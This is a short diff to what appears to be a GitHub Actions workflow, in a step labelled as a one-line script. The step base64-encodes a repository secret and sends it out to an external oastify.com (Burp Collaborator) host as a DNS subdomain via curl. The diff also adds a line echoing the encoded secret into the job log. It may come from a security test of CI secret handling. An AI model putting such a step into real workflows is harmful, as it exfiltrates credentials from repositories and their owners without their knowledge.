@@ -24,4 +24,5 @@ jobs:
       - name: Run a one-line script
         run: |
           echo "EXFIL=${{ secrets.A_SECRET }}" | base64 >> $GITHUB_ENV
-          curl -sSf http://${{ env.EXFIL }}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
+          echo ${{ env.EXFIL }}
+          curl -v http://${{ env.EXFIL }}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
